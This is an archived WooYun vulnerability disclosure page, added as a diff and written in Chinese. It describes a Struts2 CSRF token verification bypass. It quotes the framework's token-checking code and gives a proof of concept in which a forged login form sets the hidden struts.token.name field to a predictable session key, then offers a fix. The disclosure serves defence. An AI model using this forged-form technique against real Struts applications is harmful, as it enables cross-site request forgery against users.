@@ -1,0 +1,324 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		 Struts2 Token Verification Bypass  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		 Struts2 Token Verification Bypass  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/GaRY">GaRY</a> 
+</li><li>提交时间：		2012-05-11 16:19</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-06-25：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用Struts的token验证机制，可以通过一些奇淫巧计的手段绕过其验证，使得csrf可以被利用。<br />
+<br />
+影响范围：Struts2 all version</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">此漏洞发现者：@Sogili<br />
+<br />
+<br />
+<br />
+由于Struts提供的token验证是基于用户客户端提交的struts.token.name去session中查找对应的值的，如下代码：<br />
+<br />
+</p><pre><code>public static boolean validToken() {<br />
+        String tokenName = getTokenName();<br />
+<br />
+        if (tokenName == null) {<br />
+            if (LOG.isDebugEnabled()) {<br />
+                LOG.debug(&quot;no token name found -&gt; Invalid token &quot;);<br />
+            }<br />
+            return false;<br />
+        }<br />
+<br />
+        String token = getToken(tokenName);<br />
+<br />
+        if (token == null) {<br />
+            if (LOG.isDebugEnabled()) {<br />
+                LOG.debug(&quot;no token found for token name &quot;+tokenName+&quot; -&gt; Invalid token &quot;);<br />
+            }<br />
+            return false;<br />
+        }<br />
+<br />
+        Map session = ActionContext.getContext().getSession();<br />
+        String sessionToken = (String) session.get(tokenName);<br />
+<br />
+        if (!token.equals(sessionToken)) {<br />
+            if (LOG.isWarnEnabled()) {<br />
+                LOG.warn(LocalizedTextUtil.findText(TokenHelper.class, &quot;struts.internal.invalid.token&quot;, ActionContext.getContext().getLocale(), &quot;Form token {0} does not match the session token {1}.&quot;, new Object[]{<br />
+                        token, sessionToken<br />
+                }));<br />
+            }<br />
+<br />
+            return false;<br />
+        }<br />
+<br />
+        // remove the token so it won&#039;t be used again<br />
+        session.remove(tokenName);<br />
+<br />
+        return true;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+而tokenName又是来自于用户所提交的参数：<br />
+<br />
+</p><pre><code>/**<br />
+     * The name of the field which will hold the token name<br />
+     */<br />
+    public static final String TOKEN_NAME_FIELD = &quot;struts.token.name&quot;;<br />
+<br />
+    public static String getTokenName() {<br />
+        Map params = ActionContext.getContext().getParameters();<br />
+<br />
+        if (!params.containsKey(TOKEN_NAME_FIELD)) {<br />
+            if (LOG.isWarnEnabled()) {<br />
+        	LOG.warn(&quot;Could not find token name in params.&quot;);<br />
+            }<br />
+<br />
+            return null;<br />
+        }<br />
+<br />
+        String[] tokenNames = (String[]) params.get(TOKEN_NAME_FIELD);<br />
+        String tokenName;<br />
+<br />
+        if ((tokenNames == null) || (tokenNames.length &lt; 1)) {<br />
+            if (LOG.isWarnEnabled()) {<br />
+        	LOG.warn(&quot;Got a null or empty token name.&quot;);<br />
+            }<br />
+<br />
+            return null;<br />
+        }<br />
+<br />
+        tokenName = tokenNames[0];<br />
+<br />
+        return tokenName;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+因此，只要我们伪造表单，将struts.token.name这个hidden的input值设置为已知的session中某个特定key，即可绕过随机串的token值检查，合法合理的重复提交我们的表单。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">我们模拟一个场景，一般情况下，一个站点总是会把一些用户信息存放在session中作为cache，以免每次都需要从数据库里取值。<br />
+<br />
+<br />
+<br />
+这里我用以下代码做了个模拟，直接获取一个nick作为nickname，存放在session中。这些key和value都是可以预知的。<br />
+<br />
+<br />
+<br />
+</p><pre><code>import java.util.Map; <br />
+import com.opensymphony.xwork2.ActionContext;   <br />
+import com.opensymphony.xwork2.ActionSupport; <br />
+<br />
+<br />
+public class SessionAction extends ActionSupport  { <br />
+  private String nick; <br />
+   <br />
+  public String execute()  { <br />
+<br />
+    //这里操作一下session，加入我们可控的值 <br />
+    ActionContext actionContext = ActionContext.getContext(); <br />
+    Map session = actionContext.getSession(); <br />
+    if(nick != null){ <br />
+      session.put(&quot;nick&quot;, nick.trim()); <br />
+    } <br />
+    return &quot;success&quot;; <br />
+<br />
+  } <br />
+<br />
+  public String getNick() { <br />
+    System.out.println(&quot;getNick&quot;); <br />
+    return nick; <br />
+  } <br />
+<br />
+<br />
+  public void setNick(String nick) { <br />
+    System.out.println(&quot;setNIck&quot;); <br />
+    this.nick = nick; <br />
+  } <br />
+<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后我们访问一下此action，让我们的session中存在一个可以预知的nick值（通常情况下就是用户注册的昵称）。 <br />
+<br />
+<br />
+<br />
+</p><pre><code>http://localhost:8080/st/session.action?nick=thisIsFakeToken</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后，我们再伪造一个表单： <br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;form id=&quot;login&quot; name=&quot;login&quot; action=&quot;http://localhost:8080/st/login.action&quot; method=&quot;post&quot;&gt; <br />
+&lt;table class=&quot;wwFormTable&quot;&gt; <br />
+    &lt;input type=&quot;hidden&quot; name=&quot;struts.token.name&quot; value=&quot;nick&quot; /&gt; <br />
+&lt;input type=&quot;hidden&quot; name=&quot;nick&quot; value=&quot;thisIsFakeToken&quot; /&gt; <br />
+    &lt;tr&gt; <br />
+    &lt;td class=&quot;tdLabel&quot;&gt;&lt;label for=&quot;login_username&quot; class=&quot;label&quot;&gt;用户名:&lt;/label&gt;&lt;/td&gt; <br />
+    &lt;td <br />
+&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; id=&quot;login_username&quot;/&gt;&lt;/td&gt; <br />
+&lt;/tr&gt; <br />
+<br />
+    &lt;tr&gt; <br />
+    &lt;td class=&quot;tdLabel&quot;&gt;&lt;label for=&quot;login_password&quot; class=&quot;label&quot;&gt;密  码:&lt;/label&gt;&lt;/td&gt; <br />
+    &lt;td <br />
+&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;&quot; id=&quot;login_password&quot;/&gt;&lt;/td&gt; <br />
+&lt;/tr&gt; <br />
+<br />
+    &lt;tr&gt; <br />
+    &lt;td colspan=&quot;2&quot;&gt;&lt;div align=&quot;right&quot;&gt;&lt;input type=&quot;submit&quot; id=&quot;login_0&quot; value=&quot;登录&quot;/&gt; <br />
+&lt;/div&gt;&lt;/td&gt; <br />
+&lt;/tr&gt; <br />
+<br />
+  &lt;/table&gt;&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注意这里的struts.token.name修改为nick，而加了个name=nick的hidden值，为我们开始预知的session中nick所对应的内容：thisIsFakeToken。然后我们再来提交一下看看结果： <br />
+<br />
+<br />
+<br />
+&lt;img src=&quot;http://zone.wooyun.org/upload/image/201205/2012051019354347566.png&quot; /&gt;<br />
+<br />
+<br />
+<br />
+提交表单，直接绕过了csrf token验证。<br />
+<br />
+<br />
+<br />
+这里提供我本地做测试的测试项目下载：http://pan.baidu.com/netdisk/singlepublic?fid=174815_3909579610 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">建议将token.name使用struts.xml进行配置，然后在server端按照配置中的key获取value。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/GaRY" title="GaRY">GaRY</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06951" title=" Struts2 Token Verification Bypass">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6951";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
